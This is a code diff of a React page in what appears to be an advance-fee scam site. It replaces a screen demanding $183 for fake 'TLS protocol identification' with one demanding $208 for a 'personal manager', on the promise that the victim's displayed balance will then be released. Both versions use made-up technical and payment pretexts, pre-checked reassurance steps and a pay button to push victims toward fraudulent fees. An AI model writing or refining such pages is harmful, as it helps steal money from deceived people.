@@ -6,10 +6,12 @@ import { useSelector } from "react-redux"
 import { thousandsFormatter, useGoTo } from "../../utils"
 import FormCheckItem from "../../components/FormCheckItem"
 import { COMMISSION_MANUAL_PAGE, COMMISSION_PAGE } from "../../constants"
+import TransactionsStatus from "../../components/TransactionStatus"
+import ManagerStatus from "../../components/ManagerStatus"
 
 const nextPage = `/${COMMISSION_PAGE}/${COMMISSION_MANUAL_PAGE}`
-// 2-8
-const Tls = () => {
+// 3-1
+const Manual = () => {
   const balance = useSelector(state => state.user.balance)
 
   const goToNext = useGoTo()
@@ -74,45 +76,59 @@ const Tls = () => {
             fontWeight={"600"}
             textAlign={{ base: "center", md: "left" }}
           >
-            Transfer awaits the identification of the TLS protocol
+            Refusal to automatically send translation
           </Text>
-          <br />
-          <Text fontSize={{ base: "16px", md: "20px" }}>
-            Your personal digital signature is confirmed! You can use it on any
-            online services. Your browser requested the identification of the
-            TLS protocol for instantly receiving the transfer in the amount of
-            <b>${balance}</b> directly from the browser. Most likely this
-            happened due to the fact that you have two or more tabs in your
-            browser. The developer of your browser asks to confirm that the
-            translation <b>${balance}</b> get you, and not the attackers who
-            have hacked the browser.
+          <TransactionsStatus
+            margin={{ base: "20px auto 0", md: "20px 0 0" }}
+          />
+          <ManagerStatus margin={{ base: "25px auto", md: "25px 0" }} />
+          <Text
+            fontSize={"16px"}
+            display={{ base: "block", md: "none" }}
+            mb={"20px"}
+          >
+            Automatic sending of money is not supported by the payment system.
             <br />
             <br />
-            To confirm the details, you need to identify the TLS protocol by
-            replenishing the transfer amount.
+            Manual sending a money transfer to the account you specified is
+            required.
+          </Text>
+          <Text fontSize={{ base: "20px", md: "20px" }}>
+            Immediately after paying for the services of the manager, a money
+            transfer in the amount of <b>${balance}</b> will be sent.
+            <br />
+            <br />
+            The cost of the service of a personal manager in total: <b>$208.</b>
           </Text>
         </Flex>
         <Flex flexDir={"column"} fontSize={"20px"}>
-          <Text fontSize={"20px"} mb={"30px"}>
-            Immediately after the replenishment of the transfer amount, the
-            payment for the amount <b>${balance}</b> will be identified and sent
-            to these details within 10 minues.
+          <Text
+            fontSize={"16px"}
+            display={{ base: "none", md: "block" }}
+            mb={"30px"}
+          >
+            Automatic sending of money is not supported by the payment system.
             <br />
             <br />
-            Replenish the transfer amount to: <b>$183.</b>
+            Manual sending a money transfer to the account you specified is
+            required.
           </Text>
           <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
             <FormCheckItem
               checked={true}
-              label={"Replenish your balance for the specified amount."}
+              label={"Hire a personal manager by paying for his services."}
             />
             <FormCheckItem
               checked={true}
-              label={"The svstem will automatically check your signature."}
+              label={
+                " Manager will contact you immediately after payment right on our website."
+              }
             />
             <FormCheckItem
               checked={true}
-              label={"Your pavment will be sent to your details."}
+              label={
+                " You will receive your payment immediately in manual mode."
+              }
             />
           </Flex>
         </Flex>
@@ -138,7 +154,7 @@ const Tls = () => {
             onClick={() => goToNext(nextPage)}
             minW={"150px"}
           >
-            Replenish the balance
+            Hire a manager
           </Button>
         </Flex>
       </Flex>
@@ -146,4 +162,4 @@ const Tls = () => {
   )
 }
 
-export default Tls
+export default Manual
